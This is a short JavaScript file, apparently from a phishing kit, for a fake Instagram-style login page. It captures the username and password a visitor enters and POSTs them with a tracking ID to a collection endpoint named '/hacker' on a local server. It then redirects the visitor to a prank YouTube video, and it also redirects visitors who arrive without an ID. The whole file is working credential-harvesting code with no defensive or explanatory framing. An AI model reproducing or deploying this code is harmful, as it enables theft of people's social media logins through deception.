const userId = parseInt(new URLSearchParams(window.location.search).get("id"));

if(!userId) window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

const dbURL = "http://localhost:3000";

let form = document.getElementById("login-form");

form.addEventListener("submit", (e) => {
  e.preventDefault();

  let username = document.getElementById("fa4e2a34ab06a").value;
  let password = document.getElementById("faa2da1ad083").value;
  let social = "<i class='fab fa-instagram'></i>";

  const data = { userId, username, password, social };

  fetch(dbURL + "/hacker", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  }).then(() => {
     window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
  });
});
